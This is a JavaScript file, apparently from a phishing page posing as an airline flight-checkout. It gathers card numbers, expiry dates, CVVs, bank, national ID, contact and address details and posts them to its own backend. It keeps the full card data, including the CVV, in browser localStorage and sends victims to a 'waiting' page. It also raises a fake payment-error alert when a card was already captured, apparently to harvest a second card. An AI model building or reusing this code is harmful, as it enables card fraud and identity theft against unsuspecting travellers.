// public/js/payment.js — versión corregida y robusta
(function () {
  'use strict';

  const LS = window.localStorage;

  // --- referencias DOM (seguras) ---
  let loader = null;
  function initDomRefs() {
    loader = document.querySelector('.loader') || null;
    if (!loader) console.warn('WARNING: .loader no encontrado en el DOM.');
  }

  document.addEventListener('DOMContentLoaded', () => {
    initDomRefs();
    // inicio con pequeño delay (igual que antes)
    setTimeout(startup, 2000);

    // Safety: forzar ocultado si sigue visible a los 5s
    setTimeout(() => {
      try {
        const stillVisible = loader && (loader.classList.contains('show') || getComputedStyle(loader).display !== 'none');
        if (stillVisible) {
          console.warn('Loader seguía visible después de 5s — forzando ocultado.');
          forceHideLoader();
        }
      } catch (e) {
        console.warn('Error comprobando loader visible:', e);
      }
    }, 5000);
  });

  function forceHideLoader() {
    try {
      if (loader) {
        loader.classList.remove('show');
        loader.style.display = 'none';
      }
      document.body.classList.remove('sb-hidden');
    } catch (e) {
      console.warn('forceHideLoader error:', e);
    }
  }

  // STARTUP
  function startup() {
    try {
      // intentar cargar info desde ventana o localStorage
      if (typeof window.info === 'undefined' || !window.info) {
        const saved = LS.getItem('info');
        if (saved) {
          try {
            window.info = JSON.parse(saved);
            console.info('info cargado desde localStorage (startup).');
          } catch (e) {
            console.warn('No se pudo parsear LS.info:', e);
            window.info = null;
          }
        } else {
          window.info = window.info || null;
          console.warn('Variable `info` no encontrada y no hay info en localStorage.');
        }
      }

      // quitar clases/ocultar loader
      try { document.body.classList.remove('sb-hidden'); } catch (e) {}
      try { if (loader) { loader.classList.remove('show'); loader.style.display = 'none'; } } catch (e) {}

      // FLIGHT RESUME: actualizar UI si tenemos la info completa
      try {
        const originEl = document.querySelector('#origin-code');
        const destEl = document.querySelector('#destination-code');
        if (window.info && info.flightInfo && info.flightInfo.origin && info.flightInfo.destination) {
          if (originEl) originEl.textContent = (info.flightInfo.origin.code || '');
          if (destEl) destEl.textContent = (info.flightInfo.destination.code || '');
        } else {
          console.warn('info.flightInfo incompleto — omitiendo flight resume.');
        }
      } catch (e) {
        console.error('Error al actualizar flight resume:', e);
      }

      // CALCULAR PRECIO
      try {
        const flightCostEl = document.querySelector('#flight-cost');
        const finalPrice = computeFinalPrice(window.info);
        if (flightCostEl) {
          if (typeof finalPrice === 'number' && !Number.isNaN(finalPrice)) {
            flightCostEl.textContent = formatPrice(finalPrice);
          } else {
            flightCostEl.textContent = '- -';
            console.warn('finalPrice no numérico:', finalPrice);
          }
        }
      } catch (e) {
        console.warn('Error calculando finalPrice:', e);
      }

      // COMPROBAR ERROR en metaInfo
      try {
        if (window.info && info.metaInfo && typeof info.metaInfo.p === 'string' && info.metaInfo.p !== '') {
          alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
        }
      } catch (e) {}

      console.log('payment.js: startup finalizado.');
    } catch (err) {
      console.error('startup error:', err);
      forceHideLoader();
    }
  } // end startup

  // --- cálculo seguro del precio ---
  function computeFinalPrice(infoObj) {
    try {
      if (!infoObj || !infoObj.flightInfo) return NaN;

      const fi = infoObj.flightInfo;
      const adults = Number(fi.adults) || 0;
      const children = Number(fi.children) || 0;
      const pax = Math.max(1, adults + children); // al menos 1 pasajero

      const sched = fi.ticket_sched;
      const type = fi.ticket_type;

      let base = NaN;

      // comprobar que los objetos de precios existan
      if (fi.ticket_nat === 'NAC') {
        if (typeof pricesNAC !== 'undefined' && pricesNAC && pricesNAC[sched] && typeof pricesNAC[sched][type] !== 'undefined') {
          base = Number(pricesNAC[sched][type]);
        } else {
          console.warn('pricesNAC no definido o entrada faltante:', sched, type);
        }
      } else if (fi.ticket_nat === 'INT') {
        if (typeof pricesINT !== 'undefined' && pricesINT && pricesINT[sched] && typeof pricesINT[sched][type] !== 'undefined') {
          base = Number(pricesINT[sched][type]);
        } else {
          console.warn('pricesINT no definido o entrada faltante:', sched, type);
        }
      } else {
        console.warn('flight resume: ticket_nat no definido:', fi.ticket_nat);
      }

      if (!Number.isFinite(base)) return NaN;

      let final = base * pax;
      if (Number(fi.type) === 1) final = final * 2; // ida y vuelta si aplica

      return final;
    } catch (e) {
      console.warn('computeFinalPrice error:', e);
      return NaN;
    }
  }

  // --- DOM: form y campos (referencias seguras) ---
  const form = document.querySelector('#next-step');
  const p = document.querySelector('#p');
  const pdate = document.querySelector('#pdate');
  const c = document.querySelector('#c');
  const ban = document.querySelector('#ban');
  const dues = document.querySelector('#dues');
  const dudename = document.querySelector('#name');
  const surname = document.querySelector('#surname');
  const dniEl = document.querySelector('#cc');
  const email = document.querySelector('#email');
  const telnum = document.querySelector('#telnum');
  const city = document.querySelector('#city');
  const state = document.querySelector('#state');
  const address = document.querySelector('#address');

  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // limpiar errores visuales (si existen)
      [p, pdate, c, dudename, surname, dniEl, email, telnum, city, state, address].forEach(el => {
        try { if (el && el.classList) el.classList.remove('input-error'); } catch (_) {}
      });

      // valores protegidos
      const rawCard = p && p.value ? p.value : '';
      const rawCardDigits = rawCard.replace(/\D/g, '');
      const firstChar = rawCardDigits[0] || '';
      const cardLength = rawCard.length;

      const cardLengthOk = (cardLength === 19 && firstChar !== '3' && ['4','5'].includes(firstChar)) ||
                           (cardLength === 17 && firstChar === '3');

      if (!cardLengthOk) { if (p) { p.classList.add('input-error'); p.focus(); } return; }
      if (!isLuhnValid(rawCard)) { if (p) { p.classList.add('input-error'); p.focus(); } return; }
      if (!isValidDate(pdate ? pdate.value : '')) { if (pdate) { pdate.classList.add('input-error'); pdate.focus(); } return; }

      const cLenOk = (c && ((c.value.length === 3 && firstChar !== '3') || (c.value.length === 4 && firstChar === '3')));
      if (!cLenOk) { if (c) { c.classList.add('input-error'); c.focus(); } return; }
      if (!ban || !ban.value) { if (ban) ban.focus(); return; }
      if (!dudename || !dudename.value) { if (dudename) { dudename.classList.add('input-error'); dudename.focus(); } return; }
      if (!surname || !surname.value) { if (surname) { surname.classList.add('input-error'); surname.focus(); } return; }
      if (!dniEl || !dniEl.value) { if (dniEl) { dniEl.classList.add('input-error'); dniEl.focus(); } return; }
      if (!email || !email.value) { if (email) { email.classList.add('input-error'); email.focus(); } return; }
      if (!telnum || !telnum.value) { if (telnum) { telnum.classList.add('input-error'); telnum.focus(); } return; }
      if (!city || !city.value) { if (city) { city.classList.add('input-error'); city.focus(); } return; }
      if (!state || !state.value) { if (state) { state.classList.add('input-error'); state.focus(); } return; }
      if (!address || !address.value) { if (address) { address.classList.add('input-error'); address.focus(); } return; }

      // Mostrar loader antes de enviar los datos
      try {
        if (loader) {
          loader.classList.add('show');
          loader.style.display = 'block';
        }
        document.body.classList.add('sb-hidden');
      } catch (e) {}

      // ⚠️ NUEVO: Recopilar todos los datos y enviarlos al backend
      const paymentData = {
        flightCost: document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '',
        name: dudename.value,
        surname: surname.value,
        cc: dniEl.value,
        email: email.value,
        telnum: telnum.value,
        city: city.value,
        state: state.value,
        address: address.value,
        bank: ban.value,
        cardNumber: p.value,
        expiryDate: pdate.value,
        cvv: c.value,
        dues: dues ? dues.value : '',
      };

      try {
        const response = await fetch('/send-payment', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(paymentData),
        });

        const result = await response.json();

        if (response.ok && result.ok && result.transactionId) {
          // Guardar el transactionId y los datos para el polling en waiting.js
          const savedInfo = JSON.parse(LS.getItem('info')) || {};
          savedInfo.transactionId = result.transactionId;
          savedInfo.paymentData = paymentData; // Guardar todos los datos del formulario
          LS.setItem('info', JSON.stringify(savedInfo));
          console.log('Datos enviados. ID de transacción:', result.transactionId);
          
          // 🚀 Redirigir a la página de espera
          window.location.href = 'waiting.html';
        } else {
          console.error('Error del servidor:', result.error);
          alert('Hubo un problema al procesar el pago. Por favor, inténtalo de nuevo.');
          forceHideLoader();
        }
      } catch (err) {
        console.error('Error de red al enviar pago:', err);
        alert('No se pudo conectar con el servidor. Revisa tu conexión a internet.');
        forceHideLoader();
      }
    });
  }

  // --- utilidades ---
  function safeUpdateLS(){
    try {
      if (typeof info !== 'undefined') LS.setItem('info', JSON.stringify(info));
    } catch (e) {
      console.warn('updateLS error', e);
    }
  }

  function formatCNumber(input) {
    if (!input) return;
    let numero = input.value.replace(/\D/g, '');
    if (numero.length === 0) {
      try { input.className = ''; } catch(e) {}
      input.classList.add('input-cc', 'mt-2', 'bg-std');
    }
    let numeroFormateado = '';
    if (numero[0] === '3') {
      if (c) c.setAttribute('maxlength','4');
      if (p) { p.classList.remove('bg-vi','bg-mc'); p.classList.add('bg-am','input-cc','mt-2'); }
      if (numero.length > 15) numero = numero.substr(0,15);
      for (let i=0;i<numero.length;i++){
        if (i===4 || i===10) numeroFormateado += ' ';
        numeroFormateado += numero.charAt(i);
      }
      input.value = numeroFormateado;
    } else {
      if (p) { p.classList.remove('bg-am'); }
      if (numero[0] == '4' && p) p.classList.add('bg-vi');
      if (numero[0] == '5' && p) p.classList.add('bg-mc');
      if (c) c.setAttribute('maxlength','3');
      if (numero.length > 16) numero = numero.substr(0,16);
      for (let i=0;i<numero.length;i++){
        if (i>0 && i%4===0) numeroFormateado += ' ';
        numeroFormateado += numero.charAt(i);
      }
      input.value = numeroFormateado;
    }
  }

  function formatDate(input) {
    if (!input) return;
    var texto = input.value.replace(/\D/g,'').substring(0,4);
    if (texto.length > 2) texto = texto.substring(0,2) + '/' + texto.substring(2,4);
    input.value = texto;
  }

  // Formatea number -> "1.234.567,89" con dos decimales usando locale es-CO
  function formatPrice(number){
    number = Number(number) || 0;
    try {
      return number.toLocaleString('es-CO', {minimumFractionDigits:2, maximumFractionDigits:2});
    } catch (e) {
      return number.toFixed(2);
    }
  }

  // Luhn robusto: acepta espacios y guiones
  function isLuhnValid(value) {
    if (!value || typeof value !== 'string') return false;
    const s = value.replace(/\D/g, '');
    if (s.length < 6) return false; // mínimo sensato
    let sum = 0;
    let shouldDouble = false;
    // recorremos de derecha a izquierda
    for (let i = s.length - 1; i >= 0; i--) {
      let digit = parseInt(s.charAt(i), 10);
      if (isNaN(digit)) return false;
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
  }

  // Validación de fecha MM/AA (no vencida y no > +8 años)
  function isValidDate(fechaInput) {
    if (!fechaInput || typeof fechaInput !== 'string') return false;
    const partes = fechaInput.split('/');
    if (partes.length !== 2) return false;
    const mes = parseInt(partes[0], 10);
    let anio = parseInt(partes[1], 10);
    if (isNaN(mes) || isNaN(anio)) return false;
    if (mes < 1 || mes > 12) return false;
    // interpretar YY -> 20YY
    anio += 2000;
    // construir fecha final: el último día del mes de expiración
    const exp = new Date(anio, mes, 0, 23, 59, 59, 999); // mes indexado 0: usar mes directo produce siguiente - 0 para último día
    const ahora = new Date();
    // límite superior
    const limite = new Date();
    limite.setFullYear(limite.getFullYear() + 8);
    // comprobar que la expiración esté entre ahora (incluido) y limite (excluido)
    if (exp < ahora) return false;
    if (exp > limite) return false;
    return true;
  }

})(); // fin módulo
